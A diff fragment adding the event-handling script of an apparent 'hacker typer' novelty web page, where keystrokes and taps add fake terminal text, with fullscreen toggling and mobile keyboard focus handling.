+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        stopHacking();
+        return;
+      }
+      
+      // Handle fullscreen shortcuts
+      if ((e.metaKey && e.ctrlKey && e.key === 'f') || e.key === 'F11') {
+        e.preventDefault();
+        if (document.fullscreenElement) {
+          document.exitFullscreen();
+        } else {
+          document.documentElement.requestFullscreen();
+        }
+        return;
+      }
+      
+      if (!isActive) {
+        startHacking();
+      } else {
+        addCharacters();
+        
+        // Increase speed if typing fast
+        if (Math.random() < 0.1) {
+          typingSpeed = Math.min(typingSpeed + 1, 8);
+        }
+      }
+    });
+    
+    // Mobile input event listener
+    mobileInput.addEventListener('input', (e) => {
+      if (isActive) {
+        addCharacters();
+        
+        // Clear the input to allow continuous typing
+        mobileInput.value = '';
+        
+        // Increase speed if typing fast
+        if (Math.random() < 0.1) {
+          typingSpeed = Math.min(typingSpeed + 1, 8);
+        }
+      }
+    });
+    
+    // Prevent mobile input from losing focus
+    mobileInput.addEventListener('blur', () => {
+      if (isActive && detectMobile()) {
+        setTimeout(() => {
+          mobileInput.focus();
+        }, 100);
+      }
+    });
+    
+    // Click to start
+    overlay.addEventListener('click', startHacking);
+    
+    // Terminal click/tap for mobile keyboard
+    terminal.addEventListener('click', () => {
+      if (isActive && detectMobile()) {
+        focusMobileInput();
+      } else if (!isActive) {
+        startHacking();
+      }
+    });
+    
+    // Touch support for mobile
+    document.addEventListener('touchstart', (e) => {
+      if (!isActive) {
+        e.preventDefault();
+        startHacking();
+      } else {
+        if (detectMobile()) {
+          focusMobileInput();
+        } else {
+          addCharacters();
+        }
+      }
+    });
+    
+    // Handle orientation change on mobile
+    window.addEventListener('orientationchange', () => {
+      if (isActive && detectMobile()) {
+        setTimeout(() => {
+          focusMobileInput();
+        }, 500);
+      }
+    });
+    
+    // Handle window resize
+    window.addEventListener('resize', () => {
+      if (isActive && detectMobile()) {
+        setTimeout(() => {
+          focusMobileInput();
+        }, 100);
+      }
+    });
+    
+    // Prevent context menu
+    document.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+    });
+  </script>
+</body>
+</html>
